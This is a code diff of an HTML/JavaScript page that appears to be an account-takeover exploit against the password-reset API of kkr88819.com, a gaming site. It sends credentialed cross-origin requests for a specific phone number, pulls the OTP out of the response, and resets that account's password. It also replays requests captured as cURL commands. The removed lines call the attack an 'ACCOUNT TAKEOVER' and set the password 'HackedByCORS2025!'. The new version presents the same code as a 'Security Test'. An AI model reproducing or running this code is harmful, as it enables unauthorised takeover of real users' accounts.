@@ -2,125 +2,332 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>kkr88819 ATO Test</title>
+<title>kkr88819 Security Test</title>
 <style>
-    body {
-        font-family: Arial, sans-serif;
-        background: #f5f5f5;
-        padding: 20px;
-        max-width: 800px;
-        margin: 0 auto;
+    body { font-family: Arial; background: #f0f0f0; padding: 20px; }
+    .container { background: white; padding: 30px; border-radius: 10px; }
+    h1 { color: #333; }
+    .button { 
+        padding: 15px 25px; 
+        margin: 10px; 
+        background: #007bff; 
+        color: white; 
+        border: none; 
+        border-radius: 5px; 
+        cursor: pointer; 
+        font-size: 16px; 
     }
-    .container {
-        background: white;
-        padding: 30px;
-        border-radius: 10px;
-        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-    }
-    h1 {
-        color: #333;
-        border-bottom: 2px solid #eee;
-        padding-bottom: 10px;
-    }
-    .button {
-        padding: 15px 25px;
-        font-size: 16px;
-        border: none;
-        border-radius: 5px;
-        cursor: pointer;
-        margin: 10px 5px;
-        transition: background 0.3s;
-    }
-    .send-otp {
-        background: #4CAF50;
-        color: white;
-    }
-    .send-otp:hover {
-        background: #45a049;
-    }
-    .reset-pass {
-        background: #f44336;
-        color: white;
-    }
-    .reset-pass:hover {
-        background: #d32f2f;
-    }
-    .log {
-        background: #000;
-        color: #0f0;
-        padding: 15px;
-        border-radius: 5px;
-        font-family: monospace;
-        white-space: pre-wrap;
-        word-wrap: break-word;
+    .button:hover { background: #0056b3; }
+    .button-danger { background: #dc3545; }
+    .button-danger:hover { background: #c82333; }
+    .log { 
+        background: #000; 
+        color: #0f0; 
+        padding: 15px; 
+        border-radius: 5px; 
+        font-family: monospace; 
+        white-space: pre-wrap; 
         margin-top: 20px;
-        min-height: 100px;
-        max-height: 400px;
+        max-height: 500px;
         overflow-y: auto;
     }
-    .info {
-        background: #e3f2fd;
-        padding: 15px;
-        border-radius: 5px;
-        margin: 20px 0;
-        border-left: 4px solid #2196F3;
+    .info { 
+        background: #e7f3ff; 
+        padding: 15px; 
+        border-radius: 5px; 
+        margin: 20px 0; 
+        border-left: 4px solid #2196F3; 
     }
+    .debug-section { 
+        background: #f8f9fa; 
+        padding: 15px; 
+        border-radius: 5px; 
+        margin: 10px 0; 
+        border: 1px solid #dee2e6; 
+    }
+    .success { color: #28a745; }
+    .error { color: #dc3545; }
 </style>
 </head>
 <body>
 <div class="container">
-    <h1>kkr88819.com - Security Test Interface</h1>
+    <h1>kkr88819.com - Enhanced Debug Interface</h1>
     
     <div class="info">
-        <p><strong>Note:</strong> This test must be hosted on <code>https://mgpaing.github.io</code> to bypass CORS restrictions.</p>
-        <p>Target Phone: <b>+85563582231</b></p>
-        <p>Current Origin: <code id="current-origin">loading...</code></p>
+        <p><strong>Status:</strong> Running from correct origin: <code id="current-origin"></code></p>
+        <p><strong>Target:</strong> Phone: <b>+85563582231</b> | Merchant: <b>M21353</b></p>
+        <p><strong>Issue:</strong> Server responds with "parameter missing" despite all fields</p>
+    </div>
+
+    <div class="debug-section">
+        <h3>Debug Options:</h3>
+        <button class="button" onclick="testMinimal()">Test Minimal Payload</button>
+        <button class="button" onclick="testWithCaptcha()">Test with Captcha Field</button>
+        <button class="button" onclick="testWithSignature()">Test with Signature</button>
+        <button class="button" onclick="captureRealRequest()">Capture Real Browser Request</button>
     </div>
 
     <div>
-        <button class="button send-otp" onclick="sendOTP()">
-            1. Send OTP Request
+        <button class="button" onclick="sendOTP()">
+            1. Send OTP (Full Payload)
         </button>
         
-        <button class="button reset-pass" onclick="resetPass()">
+        <button class="button button-danger" onclick="resetPass()">
             2. Reset Password
         </button>
         
-        <button class="button" onclick="clearLog()" style="background: #666;">
+        <button class="button" onclick="clearLog()" style="background: #6c757d;">
             Clear Log
         </button>
     </div>
 
-    <h3>Request Log:</h3>
-    <div id="log" class="log">Ready to test... Click "Send OTP Request" to begin.</div>
+    <h3>Debug Log:</h3>
+    <div id="log" class="log">Ready... Click a test button to begin.</div>
+    
+    <div id="capture-area" style="display:none; margin-top:20px; padding:15px; background:#fff3cd; border-radius:5px;">
+        <h3>Capture Real Request:</h3>
+        <p>1. Go to the actual UAT website in another tab</p>
+        <p>2. Open DevTools (F12) → Network tab</p>
+        <p>3. Perform the "Forgot Password" flow</p>
+        <p>4. Find the request to the reset endpoint</p>
+        <p>5. Right-click → Copy → Copy as cURL</p>
+        <textarea id="curl-input" rows="6" style="width:100%; font-family:monospace; margin:10px 0;" placeholder="Paste cURL command here..."></textarea>
+        <button class="button" onclick="parseCurl()">Parse cURL and Replay</button>
+    </div>
 </div>
 
 <script>
-const URL = "https://uat-gateway.kkr88819.com/kkr-games-orchestration-center/auth/mobile/reset/login/password";
+const BASE_URL = "https://uat-gateway.kkr88819.com";
+const RESET_URL = `${BASE_URL}/kkr-games-orchestration-center/auth/mobile/reset/login/password`;
 let otp = null;
-let sessionToken = null;
+let capturedRequestData = null;
 
 // Display current origin
 document.getElementById('current-origin').textContent = window.location.origin;
 
-function log(message, data = null) {
+function log(message, type = 'info') {
     const logElement = document.getElementById('log');
     const timestamp = new Date().toLocaleTimeString();
-    let logMessage = `[${timestamp}] ${message}\n`;
+    const colorClass = type === 'error' ? 'error' : (type === 'success' ? 'success' : '');
+    const prefix = type === 'error' ? '❌' : (type === 'success' ? '✅' : '📝');
     
-    if (data) {
-        logMessage += JSON.stringify(data, null, 2) + '\n';
-    }
+    let logMessage = `<span class="${colorClass}">[${timestamp}] ${prefix} ${message}</span><br>`;
     
-    logElement.textContent = logMessage + '\n' + logElement.textContent;
+    logElement.innerHTML = logMessage + logElement.innerHTML;
+}
+
+function logData(label, data) {
+    const logElement = document.getElementById('log');
+    logElement.innerHTML += `<br><strong>${label}:</strong><br><pre style="margin:5px 0; padding:5px; background:#333; color:#fff;">${JSON.stringify(data, null, 2)}</pre><br>`;
 }
 
 function clearLog() {
-    document.getElementById('log').textContent = 'Log cleared...\n';
+    document.getElementById('log').innerHTML = 'Log cleared...<br>';
 }
 
+// Capture real request from browser DevTools
+function captureRealRequest() {
+    document.getElementById('capture-area').style.display = 'block';
+    log('Please follow the instructions to capture a real request from the browser.');
+}
+
+function parseCurl() {
+    const curlText = document.getElementById('curl-input').value;
+    if (!curlText) {
+        alert('Please paste a cURL command first');
+        return;
+    }
+    
+    try {
+        // Simple cURL parsing
+        const urlMatch = curlText.match(/--url '([^']+)'/);
+        const dataMatch = curlText.match(/--data-raw '([^']+)'/);
+        const headerMatches = curlText.matchAll(/-H '([^']+)'/g);
+        
+        if (urlMatch && dataMatch) {
+            const url = urlMatch[1];
+            const data = JSON.parse(dataMatch[1]);
+            const headers = {};
+            
+            for (const match of headerMatches) {
+                const header = match[1];
+                const [key, value] = header.split(': ');
+                if (key && value) {
+                    headers[key] = value;
+                }
+            }
+            
+            capturedRequestData = { url, data, headers };
+            log('✅ Successfully parsed cURL command', 'success');
+            logData('Captured URL', url);
+            logData('Captured Headers', headers);
+            logData('Captured Data', data);
+            
+            // Auto-fill and execute
+            executeCapturedRequest();
+        } else {
+            throw new Error('Could not parse cURL');
+        }
+    } catch (error) {
+        log(`❌ Failed to parse cURL: ${error.message}`, 'error');
+    }
+}
+
+async function executeCapturedRequest() {
+    if (!capturedRequestData) {
+        log('❌ No captured request data', 'error');
+        return;
+    }
+    
+    try {
+        log('Executing captured request...');
+        
+        const response = await fetch(capturedRequestData.url, {
+            method: "POST",
+            credentials: "include",
+            headers: capturedRequestData.headers,
+            body: JSON.stringify(capturedRequestData.data)
+        });
+        
+        const headers = {};
+        response.headers.forEach((value, key) => {
+            headers[key] = value;
+        });
+        logData('Response Headers', headers);
+        
+        const responseData = await response.json();
+        logData('Response Data', responseData);
+        
+        if (responseData.code === 0 && responseData.data) {
+            otp = responseData.data;
+            log(`✅ OTP Retrieved: ${otp}`, 'success');
+        }
+        
+    } catch (error) {
+        log(`❌ Request failed: ${error.message}`, 'error');
+    }
+}
+
+// Test with minimal required fields
+async function testMinimal() {
+    log('Testing with minimal payload...');
+    
+    const payload = {
+        "phone": "+85563582231",
+        "type": 2
+    };
+    
+    logData('Minimal Payload', payload);
+    
+    try {
+        const response = await fetch(RESET_URL, {
+            method: "POST",
+            credentials: "include",
+            headers: {
+                "Content-Type": "application/json",
+                "Origin": window.location.origin,
+                "merchantCode": "M21353"
+            },
+            body: JSON.stringify(payload)
+        });
+        
+        const responseData = await response.json();
+        logData('Response', responseData);
+        
+    } catch (error) {
+        log(`❌ Error: ${error.message}`, 'error');
+    }
+}
+
+// Test with CAPTCHA field (common requirement)
+async function testWithCaptcha() {
+    log('Testing with CAPTCHA field...');
+    
+    const payload = {
+        "phone": "+85563582231",
+        "type": 2,
+        "countryCode": "855",
+        "merchantCode": "M21353",
+        "source": "web",
+        "deviceId": "web-" + Date.now(),
+        "appVersion": "1.0.0",
+        "platform": "web",
+        "channel": "h5",
+        "language": "en",
+        "captcha": "dummy_captcha", // Try with dummy captcha
+        "captchaType": "image" // or "sms", "google"
+    };
+    
+    logData('Payload with CAPTCHA', payload);
+    
+    try {
+        const response = await fetch(RESET_URL, {
+            method: "POST",
+            credentials: "include",
+            headers: {
+                "Content-Type": "application/json",
+                "Origin": window.location.origin,
+                "merchantCode": "M21353"
+            },
+            body: JSON.stringify(payload)
+        });
+        
+        const responseData = await response.json();
+        logData('Response', responseData);
+        
+    } catch (error) {
+        log(`❌ Error: ${error.message}`, 'error');
+    }
+}
+
+// Test with signature field (common in gaming APIs)
+async function testWithSignature() {
+    log('Testing with signature...');
+    
+    const timestamp = Date.now();
+    const payload = {
+        "phone": "+85563582231",
+        "type": 2,
+        "countryCode": "855",
+        "merchantCode": "M21353",
+        "source": "web",
+        "deviceId": "web-" + timestamp,
+        "appVersion": "1.0.0",
+        "platform": "web",
+        "channel": "h5",
+        "language": "en",
+        "timestamp": timestamp,
+        "requestId": "req_" + timestamp,
+        "signature": "", // Might need to calculate this
+        "signMethod": "MD5" // or "SHA256"
+    };
+    
+    logData('Payload with Signature', payload);
+    
+    try {
+        const response = await fetch(RESET_URL, {
+            method: "POST",
+            credentials: "include",
+            headers: {
+                "Content-Type": "application/json",
+                "Origin": window.location.origin,
+                "merchantCode": "M21353",
+                "timestamp": timestamp.toString()
+            },
+            body: JSON.stringify(payload)
+        });
+        
+        const responseData = await response.json();
+        logData('Response', responseData);
+        
+    } catch (error) {
+        log(`❌ Error: ${error.message}`, 'error');
+    }
+}
+
+// Original sendOTP function with enhanced debugging
 async function sendOTP() {
-    log('Sending OTP request...');
+    log('Sending OTP request (full payload)...');
     
     const payload = {
         "phone": "+85563582231",
@@ -134,67 +341,74 @@ async function sendOTP() {
         "channel": "h5",
         "language": "en"
     };
-
-    log('Request Payload:', payload);
-
+    
+    logData('Request Payload', payload);
+    
     try {
-        const response = await fetch(URL, {
+        // Try with different content-type
+        const headers = {
+            "Content-Type": "application/json",
+            "Origin": window.location.origin,
+            "merchantCode": "M21353",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        };
+        
+        logData('Request Headers', headers);
+        
+        const response = await fetch(RESET_URL, {
             method: "POST",
-            credentials: "include", // Important for cookies/session
-            headers: {
-                "Content-Type": "application/json",
-                "Origin": window.location.origin, // Use current origin
-                "merchantCode": "M21353"
-            },
+            credentials: "include",
+            headers: headers,
             body: JSON.stringify(payload)
         });
-
-        log('Response Status:', { status: response.status, statusText: response.statusText });
         
-        // Check response headers
-        const headers = {};
+        // Log all response headers
+        const responseHeaders = {};
         response.headers.forEach((value, key) => {
-            headers[key] = value;
+            responseHeaders[key] = value;
         });
-        log('Response Headers:', headers);
-
+        logData('Response Headers', responseHeaders);
+        
+        // Check for CORS headers
+        if (!responseHeaders['access-control-allow-origin']) {
+            log('⚠️ Warning: No CORS headers in response - request may be blocked', 'error');
+        }
+        
         const responseData = await response.json();
-        log('Response Data:', responseData);
-
+        logData('Response Data', responseData);
+        
         if (responseData.code === 0 && responseData.data) {
             otp = responseData.data;
-            log(`✅ OTP Retrieved: ${otp}`);
-            alert(`OTP SUCCESS: ${otp}`);
+            log(`✅ OTP Retrieved: ${otp}`, 'success');
+            alert(`OTP: ${otp}`);
         } else {
-            log(`❌ Error: ${responseData.message || 'Unknown error'}`);
-            alert(`Failed: ${responseData.message}`);
+            log(`❌ Error: ${responseData.message}`, 'error');
         }
-
+        
     } catch (error) {
-        log('❌ Network Error:', error);
-        alert('Network error - Check console for details');
+        log(`❌ Network Error: ${error.message}`, 'error');
     }
 }
 
 async function resetPass() {
     if (!otp) {
-        alert("Please get OTP first (Step 1)");
+        alert("Please get OTP first");
         return;
     }
-
+    
     log('Attempting password reset...');
     
     const payload = {
         "phone": "+85563582231",
         "type": 3,
         "code": otp,
-        "newPassword": "HackedByCORS2025!"
+        "newPassword": "Test123!"
     };
-
-    log('Reset Payload:', payload);
-
+    
+    logData('Reset Payload', payload);
+    
     try {
-        const response = await fetch(URL, {
+        const response = await fetch(RESET_URL, {
             method: "POST",
             credentials: "include",
             headers: {
@@ -204,28 +418,24 @@ async function resetPass() {
             },
             body: JSON.stringify(payload)
         });
-
+        
         const responseData = await response.json();
-        log('Reset Response:', responseData);
-
+        logData('Reset Response', responseData);
+        
         if (responseData.code === 0) {
-            log('✅ PASSWORD RESET SUCCESSFUL!');
-            alert('ACCOUNT TAKEOVER SUCCESS - Password changed!');
+            log('✅ Password reset successful!', 'success');
+            alert('SUCCESS - Password changed!');
         } else {
-            log(`❌ Reset Failed: ${responseData.message}`);
-            alert(`Reset failed: ${responseData.message}`);
+            log(`❌ Reset failed: ${responseData.message}`, 'error');
         }
-
+        
     } catch (error) {
-        log('❌ Network Error during reset:', error);
-        alert('Reset network error');
+        log(`❌ Network error: ${error.message}`, 'error');
     }
 }
 
-// Initial check
-log(`Application loaded from: ${window.location.origin}`);
-log(`Target endpoint: ${URL}`);
-log('Note: CORS requires this to be hosted on https://mgpaing.github.io');
+// Initialize
+log('Application loaded. Use "Capture Real Request" to get the exact parameters from the actual website.');
 </script>
 </body>
 </html>
